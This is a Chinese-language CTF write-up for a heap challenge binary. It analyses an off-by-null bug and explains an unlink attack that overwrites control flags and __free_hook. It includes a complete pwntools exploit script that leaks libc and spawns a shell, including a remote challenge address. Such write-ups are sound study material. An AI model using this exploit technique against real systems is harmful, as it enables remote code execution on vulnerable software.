# 题目：PWN1

https://xz.aliyun.com/news/5361

首先看下保护机制：

```
# checksec ./data/unsafe_unlink/guosai-201x-pwn1
[*] '/root/AutoExpMarkDocker/data/unsafe_unlink/guosai-201x-pwn1'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

看到保护机制，想到要想getshell，只有通过修改__free_hook的地址为我们的onegadget，先埋下伏笔，这里分析开始漏洞：
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax

  init();
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        menu();
        v3 = read_int();
        if ( v3 != 2 )
          break;
        fr();
      }
      if ( v3 > 2 )
        break;
      if ( v3 != 1 )
        goto LABEL_13;
      ma();
    }
    if ( v3 == 3 )
    {
      ed();
    }
    else
    {
      if ( v3 != 4 )
LABEL_13:
        exit(1);
      sh();
    }
  }
}
```
提取出函数：
```python
def edit(index,Content):
    ru("show")
    sl('3')
    ru("index:")
    sl(str(index))
    ru("content:")
    sd(Content)
def free(Index):
    ru("show")
    sl('2')
    ru("index:")
    sl(str(Index))
def malloc(index,size,content):
    ru("show")
    sl('1')
    ru("index:")
    sl(str(index))
    ru("size:")
    sl(str(size))
    ru("content:")
    sd(content)
def puts(index):
    ru("show")
    sl('4')
    ru("index:")
    sl(str(index))
```

首先是malloc函数，发现很正常，输入下标，大小和内容：

```c
unsigned __int64 ma()
{
  int v1; // [rsp+0h] [rbp-10h]
  int v2; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("index:");
  v1 = read_int();
  if ( (unsigned int)v1 > 0x20 || *((_QWORD *)&heap + v1) )
    exit(0);
  puts("size:");
  v2 = read_int();
  if ( v2 <= 127 || v2 > 256 )
    exit(0);
  *((_QWORD *)&heap + v1) = malloc(v2);
  len[v1] = v2;
  printf("gift: %llx\n", *((_QWORD *)&heap + v1));
  puts("content:");
  read(0, *((void **)&heap + v1), v2);
  return __readfsqword(0x28u) ^ v3;
}
```

接着是free函数：

```c
unsigned __int64 fr()
{
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("index:");
  v1 = read_int();
  if ( (unsigned int)v1 > 0x20 || !*((_QWORD *)&heap + v1) )
    exit(0);
  free(*((void **)&heap + v1));
  *((_QWORD *)&heap + v1) = 0;  //没有UAF漏洞
  len[v1] = 0;
  return __readfsqword(0x28u) ^ v2;
}
```

接着edit函数：

```c
unsigned __int64 ed()
{
  int v1; // [rsp+Ch] [rbp-14h]
  _BYTE *v2; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( key1 == 2 )  //只能用两次
    exit(0);
  puts("index:");
  v1 = read_int();
  if ( (unsigned int)v1 > 0x20 || !heap[v1] )
    exit(0);
  puts("content:");
  v2 = (_BYTE *)heap[v1];
  v2[read(0, v2, (int)len[v1])] = 0;    //off-by-null漏洞
  ++key1;
  return __readfsqword(0x28u) ^ v3;
}
```

最后是puts函数，key2应该是0，所以用不了打印函数：

```c
unsigned __int64 sh()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( key2 )
  {
    puts("index:");
    v1 = read_int();
    if ( v1 > 0x20 || !heap[v1] )
      exit(0);
    puts((const char *)heap[v1]);
  }
  else
  {
    puts("only admin can use");
  }
  return __readfsqword(0x28u) ^ v2;
}
```

bss段中key1和key2，掌控着edit函数的使用次数和puts函数的打印功能，而且细心会发现，其实只要填到key2，因为地址占用8位，那么key1也是会被覆盖成1的，问题是要修改这里的值，得下溢，所以得往上找注入点：

```
.bss:00000000006022B5                 db    ? ;
.bss:00000000006022B6                 db    ? ;
.bss:00000000006022B7                 db    ? ;
.bss:00000000006022B8                 public key2
.bss:00000000006022B8 key2            dd ?                    ; DATA XREF: sh+17↑r
.bss:00000000006022BC                 public key1
.bss:00000000006022BC key1            dd ?                    ; DATA XREF: ed+17↑r
.bss:00000000006022BC                                         ; ed+EC↑r ...
.bss:00000000006022BC _bss            ends
.bss:00000000006022BC
```

```
.bss:00000000006020E0                 public heap       //chunk0的地址
.bss:00000000006020E0 heap            db    ? ;               ; DATA XREF: ma+49↑o
.bss:00000000006020E0                                         ; ma+B2↑o ...
.bss:00000000006021E0                 public pro
.bss:00000000006021E0 pro             db    ? ;     //chunk32的地址
```


**如果我们可以往chunk32的地址0x6021E0处写入内容的话，就可以实现下溢，0x6022b8-0x6021E0 = 0xd8字节，也就是从这里开始输入要输入0xd8的字节，同时chunk32是我们能控制的最后一个chunk块，unlink后输入的位置是chunk29的地址，有0x18的距离，0x18+0xd8=0xf0，也就是要填充0xf0的junk string，然后再写入8字节的数字，所以一共需要0xf8的大小，即堆块的大小必须要是0xf8才行，这是第一个坑点，需要计算出要malloc的堆块大小。**

接着因为off by null的原理是在输入最后加上一个\x00，溢出一个字节，那么就可以想到修改上一个堆块的状态为free，于是想到可以用unlink的做法实现chunk32的地址指向chunk29，那么我们可以构造出来：

```python
malloc(0,0xf8,'aaaa')
malloc(32,0xf8,'bbbb')
malloc(1,0xf8,'cccc')
malloc(31,0xf8,'dddd')
free_got = elf.got['free']
ptr = 0x6021E0#32
FD = ptr - 24
BK = ptr - 16
py = ''
py += p64(0) + p64(0xf1)
py += p64(FD) + p64(BK)
py = py.ljust(0xf0, "\x00")
py += p64(0xf0)
edit(32,py)
free(1)
```

我们先申请4个堆块，然后在chunk32里面做文章，构造出我们的unlink链子，由于off by one的漏洞，会把chunk1的size字节低位置为0，那么就是说我们的fake_chunk是free状态的，这时我们如果free掉chunk1，就会触发unlink从而实现了chunk32指向chunk29，如果我们edit了chunk32，就会从chunk29开始输入，下面一步步看下具体的过程，首先是申请：

fig2

接着是fake_chunk的构造：方框是fake_chunk，圆圈是我们的offbyone漏洞，使得我们的fake_chunk为free状态

fig3-4

unlink一下：

fig5-6

一个unlink实现了泄露出libc基地址和0x6021e0指向0x6021c8，接着再改写key1和key2：
```python
py = ''
py += p64(0x6021E0)*3 + p64(free_got)#0x20
py += 'a'*0xD0
py += p64(1)
edit(32,py)
```
下图中key2为0，key1位1（改写前），可edit不可puts

fig7

下图中key2为1，key1位0（改写后）可edit可puts

fig8

这里很巧妙的一点就是chunk29到chunk31都填写chunk32的地址，也就是往chunk29到chunk31写入内容实则都是往chunk32写入内容，那么我们可以进行真实地址泄露了，这里可以puts出chunk32上面的free的真实地址，也可以通过打印1号块的内容来泄露main_arena地址（unsorted bin攻击），打印完了我们就可以得到system和onegadget和free_hook的地址，然后将free_hook地址写入到chunk32中，再往chunk32写入onegadget：

上exp：
```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
#context(arch='i386', os='linux')
local = 1
elf = ELF('./pwn1')
if local:
    p = process('./pwn1')
    libc = elf.libc
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('./libc.so.6')

def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))
def bk(addr):
    gdb.attach(p,"b *"+str(hex(addr)))

def edit(index,Content):
    ru("show")
    sl('3')
    ru("index:")
    sl(str(index))
    ru("content:")
    sd(Content)
def free(Index):
    ru("show")
    sl('2')
    ru("index:")
    sl(str(Index))
def malloc(index,size,content):
    ru("show")
    sl('1')
    ru("index:")
    sl(str(index))
    ru("size:")
    sl(str(size))
    ru("content:")
    sd(content)
def puts(index):
    ru("show")
    sl('4')
    ru("index:")
    sl(str(index))


#bk(0x400990)
malloc(0,0xf8,'aaaa')
malloc(32,0xf8,'bbbb')
malloc(1,0xf8,'cccc')
malloc(31,0xf8,'dddd')
free_got = elf.got['free']
ptr = 0x6021E0#32
FD = ptr - 24
BK = ptr - 16
py = ''
py += p64(0) + p64(0xf1)
py += p64(FD) + p64(BK)
py = py.ljust(0xf0, "\x00")
py += p64(0xf0)
edit(32,py)
free(1)
#0xF8
py = ''
py += p64(0x6021E0)*3 + p64(free_got)
py += 'a'*0xD0
py += p64(1)
edit(32,py)
puts(32)
free_addr = u64(ru('\x7f')[-6:].ljust(8,'\x00'))
print "free_addr--->" + hex(free_addr)
onegadget = free_addr - libc.symbols["free"] + 0x4526a
print "onegadget--->" + hex(onegadget)
free_hook = free_addr - libc.symbols["free"] + libc.symbols['__free_hook']
print "free_hook--->" + hex(free_hook)
pay = p64(free_hook)#这里需要注意，edit又会被使用完，所以需要再覆盖一次为1
pay = pay.ljust(0xf0,'\x00')
pay += p64(1)
edit(31,pay)
edit(32,p64(onegadget))
free(0)
p.interactive()
```

最后free掉chunk0即可getshell~

fig9-11
